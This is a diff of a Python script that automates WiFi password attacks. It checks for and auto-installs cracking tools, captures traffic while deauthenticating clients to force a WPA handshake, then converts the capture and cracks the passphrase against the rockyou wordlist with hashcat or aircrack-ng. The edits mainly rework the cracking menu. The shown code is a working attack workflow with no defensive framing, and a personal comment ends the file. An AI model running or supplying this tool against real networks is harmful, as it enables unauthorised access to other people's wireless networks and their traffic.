@@ -12,7 +12,6 @@ def check_handshake(pcap_file):
     return 'EAPOL' in result.stdout.decode()
 
 def install_package(package):
-    """Install a package using apt-get (for Debian-based systems). Modify as needed."""
     try:
         subprocess.run(['apt-get', 'install', '-y', package], check=True)
     except subprocess.CalledProcessError as e:
@@ -20,30 +19,19 @@ def install_package(package):
         sys.exit(1)
 
 def check_program_installed(program):
-    """Check if a program is installed on the system. Install if missing."""
     try:
         subprocess.run(['which', program], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
         return True
     except subprocess.CalledProcessError:
         print(f'{program} is not installed. Installing...')
         if program == 'hcxpcapngtool':
-            install_package('hcxtools')  # Install hcxtools package which includes hcxpcapngtool
-        elif program in ['tshark', 'aircrack-ng', 'hashcat', 'john']:
+            install_package('hcxtools')  # hcxpcapngtool is in the hcxtools package
+        elif program in ['tshark', 'aircrack-ng', 'hashcat', 'john', 'hccap2john']:
             install_package(program)
         else:
             print(f'Error: {program} installation not supported.')
             sys.exit(1)
         return False
-
-def print_menu():
-    print("""
-Choose a cracking method:
-    [1] Crack with aircrack-ng
-    [2] Crack with hashcat
-    [3] Crack with john the ripper
-    [4] Skip cracking
-    [5] Exit
-    """)
 
 def get_valid_interface():
     while True:
@@ -56,7 +44,7 @@ def get_valid_interface():
 
 def main():
     # Check required programs
-    required_programs = ['tshark', 'aircrack-ng', 'hcxpcapngtool', 'hashcat', 'john']
+    required_programs = ['tshark', 'aircrack-ng', 'hcxpcapngtool', 'hashcat', 'john', 'hccap2john']
     for prog in required_programs:
         if not check_program_installed(prog):
             print(f'Error: {prog} is not installed. Please install it and try again.')
@@ -113,7 +101,7 @@ def main():
         airodump_process.terminate()
 
     print('\nChecking for handshake...')
-    time.sleep(5)  # Give some time for the deauth attack to capture the handshake
+    time.sleep(1) 
 
     if check_handshake(pcap_file):
         while True:
@@ -124,8 +112,14 @@ def main():
                 if not wordlist:
                     wordlist = '/usr/share/wordlists/rockyou.txt'
 
-                while True:
-                    print_menu()
+                cracked = False
+                while not cracked:
+                    print("""
+                        Choose a tool to (attempt) to crack the handshake:
+                        [1] Crack with aircrack-ng
+                        [2] Crack with hashcat
+                        [3] Exit
+                        """)
                     choice = input('Choice: ')
 
                     if choice == '1':
@@ -135,26 +129,23 @@ def main():
                         hash_file = f'/tmp/{outfile}.hc22000'
                         subprocess.run(['hcxpcapngtool', '-o', hash_file, pcap_file])
                         subprocess.run(['hashcat', '-m', '22000', '-a', '0', hash_file, wordlist])
-                        break
+                        cracked = True
                     elif choice == '3':
-                        subprocess.run(['john', '--wordlist=' + wordlist, pcap_file])
-                        break
-                    elif choice == '4':
-                        print('Skipping password cracking.')
-                        break
-                    elif choice == '5':
+
                         print('Exiting...')
                         sys.exit(0)
                     else:
                         print('Invalid choice, please try again.')
-            elif crack.lower() == 'n':
-                print('Skipping password cracking.')
                 break
+            elif crack.lower() == 'n':
+                print('Skipping password cracking. The pcap files are stored in the /tmp directory if you want to see them.')
+                exit()
             else:
-                print('Invalid option. Please enter y or n.')
+                print('Invalid option. Please enter y/n.')
     else:
         print('No handshake detected.')
 
 if __name__ == '__main__':
     main()
+
 #Tasneem will you marry me :)
